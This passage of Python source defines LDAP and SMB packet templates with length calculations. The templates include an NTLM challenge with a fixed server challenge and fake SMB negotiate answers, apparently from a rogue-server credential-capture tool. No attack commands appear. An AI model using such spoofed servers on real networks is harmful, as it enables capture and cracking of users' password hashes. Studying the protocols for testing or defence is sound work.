        ("SearchAttribASN3LenOfLen", "\x84"),
        ("SearchAttribASN3Len",      "\x00\x00\x00\x4a"),
        ("SearchAttrib1ASNID",       "\x04"),
        ("SearchAttrib1ASNLen",      "\x16"),#22
        ("SearchAttrib1ASNStr",      "1.2.840.113556.1.4.800"),
        ("SearchAttrib2ASNID",       "\x04"),
        ("SearchAttrib2ASNLen",      "\x17"),#23
        ("SearchAttrib2ASNStr",      "1.2.840.113556.1.4.1670"),
        ("SearchAttrib3ASNID",       "\x04"),
        ("SearchAttrib3ASNLen",      "\x17"),#23
        ("SearchAttrib3ASNStr",      "1.2.840.113556.1.4.1791"),
        ("SearchDoneASNID",          "\x30"),
        ("SearchDoneASNLenOfLen",    "\x84"),
        ("SearchDoneASNLen",         "\x00\x00\x00\x10"),#16
        ("MessageIDASN2ID",          "\x02"),
        ("MessageIDASN2Len",         "\x01"),
        ("MessageIDASN2Str",         "\x02"),
        ("SearchDoneStr",            "\x65\x84\x00\x00\x00\x07\x0a\x01\x00\x04\x00\x04\x00"),
        ## No need to calculate anything this time, this packet is generic.
    ])

class LDAPSearchSupportedMechanismsPacket(Packet):
    fields = OrderedDict([
        ("ParserHeadASNID",          "\x30"),
        ("ParserHeadASNLenOfLen",    "\x84"),
        ("ParserHeadASNLen",         "\x00\x00\x00\x60"),#96
        ("MessageIDASNID",           "\x02"),
        ("MessageIDASNLen",          "\x01"),
        ("MessageIDASNStr",          "\x02"),
        ("OpHeadASNID",              "\x64"),
        ("OpHeadASNIDLenOfLen",      "\x84"),
        ("OpHeadASNIDLen",           "\x00\x00\x00\x57"),#87
        ("ObjectName",               "\x04\x00"),
        ("SearchAttribASNID",        "\x30"),
        ("SearchAttribASNLenOfLen",  "\x84"),
        ("SearchAttribASNLen",       "\x00\x00\x00\x4f"),#79
        ("SearchAttribASNID1",       "\x30"),
        ("SearchAttribASN1LenOfLen", "\x84"),
        ("SearchAttribASN1Len",      "\x00\x00\x00\x49"),#73
        ("SearchAttribASN2ID",       "\x04"),
        ("SearchAttribASN2Len",      "\x17"),#23
        ("SearchAttribASN2Str",      "supportedSASLMechanisms"),
        ("SearchAttribASN3ID",       "\x31"),
        ("SearchAttribASN3LenOfLen", "\x84"),
        ("SearchAttribASN3Len",      "\x00\x00\x00\x2a"),#42
        ("SearchAttrib1ASNID",       "\x04"),
        ("SearchAttrib1ASNLen",      "\x06"),#6
        ("SearchAttrib1ASNStr",      "GSSAPI"),
        ("SearchAttrib2ASNID",       "\x04"),
        ("SearchAttrib2ASNLen",      "\x0a"),#10
        ("SearchAttrib2ASNStr",      "GSS-SPNEGO"),
        ("SearchAttrib3ASNID",       "\x04"),
        ("SearchAttrib3ASNLen",      "\x08"),#8
        ("SearchAttrib3ASNStr",      "EXTERNAL"),
        ("SearchAttrib4ASNID",       "\x04"),
        ("SearchAttrib4ASNLen",      "\x0a"),#10
        ("SearchAttrib4ASNStr",      "DIGEST-MD5"),
        ("SearchDoneASNID",          "\x30"),
        ("SearchDoneASNLenOfLen",    "\x84"),
        ("SearchDoneASNLen",         "\x00\x00\x00\x10"),#16
        ("MessageIDASN2ID",          "\x02"),
        ("MessageIDASN2Len",         "\x01"),
        ("MessageIDASN2Str",         "\x02"),
        ("SearchDoneStr",            "\x65\x84\x00\x00\x00\x07\x0a\x01\x00\x04\x00\x04\x00"),
        ## No need to calculate anything this time, this packet is generic.
    ])

class LDAPNTLMChallenge(Packet):
    fields = OrderedDict([
        ("ParserHeadASNID",                           "\x30"),
        ("ParserHeadASNLenOfLen",                     "\x84"),
        ("ParserHeadASNLen",                          "\x00\x00\x00\xD0"),#208
        ("MessageIDASNID",                            "\x02"),
        ("MessageIDASNLen",                           "\x01"),
        ("MessageIDASNStr",                           "\x02"),
        ("OpHeadASNID",                               "\x61"),
        ("OpHeadASNIDLenOfLen",                       "\x84"),
        ("OpHeadASNIDLen",                            "\x00\x00\x00\xc7"),#199
        ("Status",                                    "\x0A"),
        ("StatusASNLen",                              "\x01"),
        ("StatusASNStr",                              "\x0e"), #In Progress.
        ("MatchedDN",                                 "\x04\x00"), #Null
        ("ErrorMessage",                              "\x04\x00"), #Null
        ("SequenceHeader",                            "\x87"),
        ("SequenceHeaderLenOfLen",                    "\x81"),
        ("SequenceHeaderLen",                         "\x82"), #188
        ("NTLMSSPSignature",                          "NTLMSSP"),
        ("NTLMSSPSignatureNull",                      "\x00"),
        ("NTLMSSPMessageType",                        "\x02\x00\x00\x00"),
        ("NTLMSSPNtWorkstationLen",                   "\x1e\x00"),
        ("NTLMSSPNtWorkstationMaxLen",                "\x1e\x00"),
        ("NTLMSSPNtWorkstationBuffOffset",            "\x38\x00\x00\x00"),
        ("NTLMSSPNtNegotiateFlags",                   "\x15\x82\x89\xe2"),
        ("NTLMSSPNtServerChallenge",                  "\x81\x22\x33\x34\x55\x46\xe7\x88"),
        ("NTLMSSPNtReserved",                         "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("NTLMSSPNtTargetInfoLen",                    "\x94\x00"),
        ("NTLMSSPNtTargetInfoMaxLen",                 "\x94\x00"),
        ("NTLMSSPNtTargetInfoBuffOffset",             "\x56\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionHigh",     "\x05"),
        ("NegTokenInitSeqMechMessageVersionLow",      "\x02"),
        ("NegTokenInitSeqMechMessageVersionBuilt",    "\xce\x0e"),
        ("NegTokenInitSeqMechMessageVersionReserved", "\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionNTLMType", "\x0f"),
        ("NTLMSSPNtWorkstationName",                  "SMB12"),
        ("NTLMSSPNTLMChallengeAVPairsId",             "\x02\x00"),
        ("NTLMSSPNTLMChallengeAVPairsLen",            "\x0a\x00"),
        ("NTLMSSPNTLMChallengeAVPairsUnicodeStr",     "smb12"),
        ("NTLMSSPNTLMChallengeAVPairs1Id",            "\x01\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1Len",           "\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1UnicodeStr",    "SERVER2008"),
        ("NTLMSSPNTLMChallengeAVPairs2Id",            "\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2Len",           "\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2UnicodeStr",    "smb12.local"),
        ("NTLMSSPNTLMChallengeAVPairs3Id",            "\x03\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3Len",           "\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3UnicodeStr",    "SERVER2008.smb12.local"),
        ("NTLMSSPNTLMChallengeAVPairs5Id",            "\x05\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5Len",           "\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5UnicodeStr",    "smb12.local"),
        ("NTLMSSPNTLMChallengeAVPairs6Id",            "\x00\x00"),
        ("NTLMSSPNTLMChallengeAVPairs6Len",           "\x00\x00"),
    ])

    def calculate(self):

        ###### Convert strings to Unicode first
        self.fields["NTLMSSPNtWorkstationName"] = self.fields["NTLMSSPNtWorkstationName"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"].encode('utf-16le')

        ###### Workstation Offset
        CalculateOffsetWorkstation = str(self.fields["NTLMSSPSignature"])+str(self.fields["NTLMSSPSignatureNull"])+str(self.fields["NTLMSSPMessageType"])+str(self.fields["NTLMSSPNtWorkstationLen"])+str(self.fields["NTLMSSPNtWorkstationMaxLen"])+str(self.fields["NTLMSSPNtWorkstationBuffOffset"])+str(self.fields["NTLMSSPNtNegotiateFlags"])+str(self.fields["NTLMSSPNtServerChallenge"])+str(self.fields["NTLMSSPNtReserved"])+str(self.fields["NTLMSSPNtTargetInfoLen"])+str(self.fields["NTLMSSPNtTargetInfoMaxLen"])+str(self.fields["NTLMSSPNtTargetInfoBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])
        ###### AvPairs Offset
        CalculateLenAvpairs = str(self.fields["NTLMSSPNTLMChallengeAVPairsId"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsLen"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs2Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs3Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs5Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs6Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs6Len"])
        ###### LDAP Packet Len
        CalculatePacketLen = str(self.fields["MessageIDASNID"])+str(self.fields["MessageIDASNLen"])+str(self.fields["MessageIDASNStr"])+str(self.fields["OpHeadASNID"])+str(self.fields["OpHeadASNIDLenOfLen"])+str(self.fields["OpHeadASNIDLen"])+str(self.fields["Status"])+str(self.fields["StatusASNLen"])+str(self.fields["StatusASNStr"])+str(self.fields["MatchedDN"])+str(self.fields["ErrorMessage"])+str(self.fields["SequenceHeader"])+str(self.fields["SequenceHeaderLen"])+str(self.fields["SequenceHeaderLenOfLen"])+CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])+CalculateLenAvpairs
        OperationPacketLen = str(self.fields["Status"])+str(self.fields["StatusASNLen"])+str(self.fields["StatusASNStr"])+str(self.fields["MatchedDN"])+str(self.fields["ErrorMessage"])+str(self.fields["SequenceHeader"])+str(self.fields["SequenceHeaderLen"])+str(self.fields["SequenceHeaderLenOfLen"])+CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])+CalculateLenAvpairs
        NTLMMessageLen = CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])+CalculateLenAvpairs

        ##### LDAP Len Calculation:
        self.fields["ParserHeadASNLen"] = struct.pack(">i", len(CalculatePacketLen))
        self.fields["OpHeadASNIDLen"] = struct.pack(">i", len(OperationPacketLen))
        self.fields["SequenceHeaderLen"] = struct.pack(">B", len(NTLMMessageLen))
        ##### Workstation Offset Calculation:
        self.fields["NTLMSSPNtWorkstationBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation))
        self.fields["NTLMSSPNtWorkstationLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNtWorkstationName"])))
        self.fields["NTLMSSPNtWorkstationMaxLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNtWorkstationName"])))
        ##### IvPairs Offset Calculation:
        self.fields["NTLMSSPNtTargetInfoBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])))
        self.fields["NTLMSSPNtTargetInfoLen"] = struct.pack("<h", len(CalculateLenAvpairs))
        self.fields["NTLMSSPNtTargetInfoMaxLen"] = struct.pack("<h", len(CalculateLenAvpairs))
        ##### IvPair Calculation:
        self.fields["NTLMSSPNTLMChallengeAVPairs5Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs3Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs2Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs1Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairsLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])))

##### SMB Packets #####
class SMBHeader(Packet):
    fields = OrderedDict([
        ("proto", b"\xff\x53\x4d\x42"),
        ("cmd", b"\x72"),
        ("errorcode", b"\x00\x00\x00\x00"),
        ("flag1", b"\x00"),
        ("flag2", b"\x00\x00"),
        ("pidhigh", b"\x00\x00"),
        ("signature", b"\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("reserved", b"\x00\x00"),
        ("tid", b"\x00\x00"),
        ("pid", b"\x00\x00"),
        ("uid", b"\x00\x00"),
        ("mid", b"\x00\x00"),
    ])

class SMBNego(Packet):
    fields = OrderedDict([
        ("wordcount", "\x00"),
        ("bcc", "\x62\x00"),
        ("data", "")
    ])

    def calculate(self):
        self.fields["bcc"] = struct.pack("<h",len(str(self.fields["data"])))

class SMBNegoData(Packet):
    fields = OrderedDict([
        ("wordcount", "\x00"),
        ("bcc", "\x54\x00"),
        ("separator1","\x02" ),
        ("dialect1", "\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00"),
        ("separator2","\x02"),
        ("dialect2", "\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"),
    ])

    def calculate(self):
        CalculateBCC  = str(self.fields["separator1"])+str(self.fields["dialect1"])
        CalculateBCC += str(self.fields["separator2"])+str(self.fields["dialect2"])
        self.fields["bcc"] = struct.pack("<h", len(CalculateBCC))

class SMBSessionData(Packet):
    fields = OrderedDict([
        ("wordcount", "\x0a"),
        ("AndXCommand", "\xff"),
        ("reserved","\x00"),
        ("andxoffset", "\x00\x00"),
        ("maxbuff","\xff\xff"),
        ("maxmpx", "\x02\x00"),
        ("vcnum","\x01\x00"),
        ("sessionkey", "\x00\x00\x00\x00"),
        ("PasswordLen","\x18\x00"),
        ("reserved2","\x00\x00\x00\x00"),
        ("bcc","\x3b\x00"),
        ("AccountPassword",""),
        ("AccountName",""),
        ("AccountNameTerminator","\x00"),
        ("PrimaryDomain","WORKGROUP"),
        ("PrimaryDomainTerminator","\x00"),
        ("NativeOs","Unix"),
        ("NativeOsTerminator","\x00"),
        ("NativeLanman","Samba"),
        ("NativeLanmanTerminator","\x00"),

    ])
    def calculate(self):
        CompleteBCC = str(self.fields["AccountPassword"])+str(self.fields["AccountName"])+str(self.fields["AccountNameTerminator"])+str(self.fields["PrimaryDomain"])+str(self.fields["PrimaryDomainTerminator"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsTerminator"])+str(self.fields["NativeLanman"])+str(self.fields["NativeLanmanTerminator"])
        self.fields["bcc"] = struct.pack("<h", len(CompleteBCC))
        self.fields["PasswordLen"] = struct.pack("<h", len(str(self.fields["AccountPassword"])))

class SMBNegoFingerData(Packet):
    fields = OrderedDict([
        ("separator1","\x02" ),
        ("dialect1", "\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00"),
        ("separator2","\x02"),
        ("dialect2", "\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"),
        ("separator3","\x02"),
        ("dialect3", "\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00"),
        ("separator4","\x02"),
        ("dialect4", "\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00"),
        ("separator5","\x02"),
        ("dialect5", "\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00"),
        ("separator6","\x02"),
        ("dialect6", "\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"),
    ])

class SMBSessionFingerData(Packet):
    fields = OrderedDict([
        ("wordcount", "\x0c"),
        ("AndXCommand", "\xff"),
        ("reserved","\x00" ),
        ("andxoffset", "\x00\x00"),
        ("maxbuff","\x04\x11"),
        ("maxmpx", "\x32\x00"),
        ("vcnum","\x00\x00"),
        ("sessionkey", "\x00\x00\x00\x00"),
        ("securitybloblength","\x4a\x00"),
        ("reserved2","\x00\x00\x00\x00"),
        ("capabilities", "\xd4\x00\x00\xa0"),
        ("bcc1",""),
        ("Data","\x60\x48\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2\x2a\x04\x28\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\xa2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x01\x28\x0a\x00\x00\x00\x0f\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x32\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x20\x00\x50\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x33\x00\x20\x00\x32\x00\x36\x00\x30\x00\x30\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x32\x00\x20\x00\x35\x00\x2e\x00\x31\x00\x00\x00\x00\x00"),

    ])
    def calculate(self):
        self.fields["bcc1"] = struct.pack("<i", len(str(self.fields["Data"])))[:2]

class SMBTreeConnectData(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x04"),
        ("AndXCommand", "\xff"),
        ("Reserved","\x00" ),
        ("Andxoffset", "\x00\x00"),
        ("Flags","\x08\x00"),
        ("PasswdLen", "\x01\x00"),
        ("Bcc","\x1b\x00"),
        ("Passwd", "\x00"),
        ("Path",""),
        ("PathTerminator","\x00"),
        ("Service","?????"),
        ("Terminator", "\x00"),

    ])
    def calculate(self):
        self.fields["PasswdLen"] = struct.pack("<h", len(str(self.fields["Passwd"])))[:2]
        BccComplete = str(self.fields["Passwd"])+str(self.fields["Path"])+str(self.fields["PathTerminator"])+str(self.fields["Service"])+str(self.fields["Terminator"])
        self.fields["Bcc"] = struct.pack("<h", len(BccComplete))

class RAPNetServerEnum3Data(Packet):
    fields = OrderedDict([
        ("Command", "\xd7\x00"),
        ("ParamDescriptor", "WrLehDzz"),
        ("ParamDescriptorTerminator", "\x00"),
        ("ReturnDescriptor","B16BBDz"),
        ("ReturnDescriptorTerminator", "\x00"),
        ("DetailLevel", "\x01\x00"),
        ("RecvBuff","\xff\xff"),
        ("ServerType", "\x00\x00\x00\x80"),
        ("TargetDomain","SMB"),
        ("RapTerminator","\x00"),
        ("TargetName","ABCD"),
        ("RapTerminator2","\x00"),
    ])

class SMBTransRAPData(Packet):
    fields = OrderedDict([
        ("Wordcount", "\x0e"),
        ("TotalParamCount", "\x24\x00"),
        ("TotalDataCount","\x00\x00" ),
        ("MaxParamCount", "\x08\x00"),
        ("MaxDataCount","\xff\xff"),
        ("MaxSetupCount", "\x00"),
        ("Reserved","\x00\x00"),
        ("Flags", "\x00"),
        ("Timeout","\x00\x00\x00\x00"),
        ("Reserved1","\x00\x00"),
        ("ParamCount","\x24\x00"),
        ("ParamOffset", "\x5a\x00"),
        ("DataCount", "\x00\x00"),
        ("DataOffset", "\x7e\x00"),
        ("SetupCount", "\x00"),
        ("Reserved2", "\x00"),
        ("Bcc", "\x3f\x00"),
        ("Terminator", "\x00"),
        ("PipeName", "\\PIPE\\LANMAN"),
        ("PipeTerminator","\x00\x00"),
        ("Data", ""),

    ])
    def calculate(self):
        #Padding
        if len(str(self.fields["Data"]))%2==0:
           self.fields["PipeTerminator"] = "\x00\x00\x00\x00"
        else:
           self.fields["PipeTerminator"] = "\x00\x00\x00"
        ##Convert Path to Unicode first before any Len calc.
        self.fields["PipeName"] = self.fields["PipeName"].encode('utf-16le')
        ##Data Len
        self.fields["TotalParamCount"] = struct.pack("<i", len(str(self.fields["Data"])))[:2]
        self.fields["ParamCount"] = struct.pack("<i", len(str(self.fields["Data"])))[:2]
        ##Packet len
        FindRAPOffset = str(self.fields["Wordcount"])+str(self.fields["TotalParamCount"])+str(self.fields["TotalDataCount"])+str(self.fields["MaxParamCount"])+str(self.fields["MaxDataCount"])+str(self.fields["MaxSetupCount"])+str(self.fields["Reserved"])+str(self.fields["Flags"])+str(self.fields["Timeout"])+str(self.fields["Reserved1"])+str(self.fields["ParamCount"])+str(self.fields["ParamOffset"])+str(self.fields["DataCount"])+str(self.fields["DataOffset"])+str(self.fields["SetupCount"])+str(self.fields["Reserved2"])+str(self.fields["Bcc"])+str(self.fields["Terminator"])+str(self.fields["PipeName"])+str(self.fields["PipeTerminator"])
        self.fields["ParamOffset"] = struct.pack("<i", len(FindRAPOffset)+32)[:2]
        ##Bcc Buff Len
        BccComplete    = str(self.fields["Terminator"])+str(self.fields["PipeName"])+str(self.fields["PipeTerminator"])+str(self.fields["Data"])
        self.fields["Bcc"] = struct.pack("<i", len(BccComplete))[:2]

class SMBNegoAnsLM(Packet):
    fields = OrderedDict([
        ("Wordcount",    "\x11"),
        ("Dialect",      ""),
        ("Securitymode", "\x03"),
        ("MaxMpx",       "\x32\x00"),
        ("MaxVc",        "\x01\x00"),
        ("Maxbuffsize",  "\x04\x41\x00\x00"),
        ("Maxrawbuff",   "\x00\x00\x01\x00"),
        ("Sessionkey",   "\x00\x00\x00\x00"),
        ("Capabilities", "\xfc\x3e\x01\x00"),
        ("Systemtime",   "\x84\xd6\xfb\xa3\x01\x35\xcd\x01"),
        ("Srvtimezone",  "\x2c\x01"),
        ("Keylength",    "\x08"),
        ("Bcc",          "\x10\x00"),
        ("Key",          ""),
        ("Domain",       "SMB"),
        ("DomainNull",   "\x00\x00"),
        ("Server",       "SMB-TOOLKIT"),
        ("ServerNull",   "\x00\x00"),
    ])

    def calculate(self):
        self.fields["Domain"] = self.fields["Domain"].encode('utf-16le')
        self.fields["Server"] = self.fields["Server"].encode('utf-16le')
        CompleteBCCLen =  str(self.fields["Key"])+str(self.fields["Domain"])+str(self.fields["DomainNull"])+str(self.fields["Server"])+str(self.fields["ServerNull"])
        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen))
        self.fields["Keylength"] = struct.pack("<h",len(self.fields["Key"]))[0]

class SMBNegoAns(Packet):
    fields = OrderedDict([
        ("Wordcount",    "\x11"),
        ("Dialect",      ""),
        ("Securitymode", "\x03"),
        ("MaxMpx",       "\x32\x00"),
        ("MaxVc",        "\x01\x00"),
        ("MaxBuffSize",  "\x04\x41\x00\x00"),
        ("MaxRawBuff",   "\x00\x00\x01\x00"),
        ("SessionKey",   "\x00\x00\x00\x00"),
        ("Capabilities", "\xfd\xf3\x01\x80"),
        ("SystemTime",   "\x84\xd6\xfb\xa3\x01\x35\xcd\x01"),
        ("SrvTimeZone",  "\xf0\x00"),
        ("KeyLen",    "\x00"),
        ("Bcc",          "\x57\x00"),
        ("Guid",         "\xc8\x27\x3d\xfb\xd4\x18\x55\x4f\xb2\x40\xaf\xd7\x61\x73\x75\x3b"),
        ("InitContextTokenASNId",     "\x60"),
        ("InitContextTokenASNLen",    "\x5b"),
        ("ThisMechASNId",             "\x06"),
        ("ThisMechASNLen",            "\x06"),
        ("ThisMechASNStr",            "\x2b\x06\x01\x05\x05\x02"),
        ("SpNegoTokenASNId",          "\xA0"),
        ("SpNegoTokenASNLen",         "\x51"),
        ("NegTokenASNId",             "\x30"),
        ("NegTokenASNLen",            "\x4f"),
        ("NegTokenTag0ASNId",         "\xA0"),
        ("NegTokenTag0ASNLen",        "\x30"),
        ("NegThisMechASNId",          "\x30"),
        ("NegThisMechASNLen",         "\x2e"),
        ("NegThisMech4ASNId",         "\x06"),
        ("NegThisMech4ASNLen",        "\x09"),
        ("NegThisMech4ASNStr",        "\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("NegTokenTag3ASNId",         "\xA3"),
        ("NegTokenTag3ASNLen",        "\x1b"),
        ("NegHintASNId",              "\x30"),
        ("NegHintASNLen",             "\x19"),
        ("NegHintTag0ASNId",          "\xa0"),
        ("NegHintTag0ASNLen",         "\x17"),
        ("NegHintFinalASNId",         "\x1b"),
        ("NegHintFinalASNLen",        "\x15"),
        ("NegHintFinalASNStr",        "server2008$@SMB.LOCAL"),
    ])

    def calculate(self):
        CompleteBCCLen1 =  str(self.fields["Guid"])+str(self.fields["InitContextTokenASNId"])+str(self.fields["InitContextTokenASNLen"])+str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
        AsnLenStart = str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
        AsnLen2 = str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])
        MechTypeLen = str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])
        Tag3Len = str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])

        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen1))
        self.fields["InitContextTokenASNLen"] = struct.pack("<B", len(AsnLenStart))
        self.fields["ThisMechASNLen"] = struct.pack("<B", len(str(self.fields["ThisMechASNStr"])))
        self.fields["SpNegoTokenASNLen"] = struct.pack("<B", len(AsnLen2))
        self.fields["NegTokenASNLen"] = struct.pack("<B", len(AsnLen2)-2)
        self.fields["NegTokenTag0ASNLen"] = struct.pack("<B", len(MechTypeLen))
        self.fields["NegThisMechASNLen"] = struct.pack("<B", len(MechTypeLen)-2)
        self.fields["NegThisMech4ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech4ASNStr"])))
        self.fields["NegTokenTag3ASNLen"] = struct.pack("<B", len(Tag3Len))
        self.fields["NegHintASNLen"] = struct.pack("<B", len(Tag3Len)-2)
        self.fields["NegHintTag0ASNLen"] = struct.pack("<B", len(Tag3Len)-4)
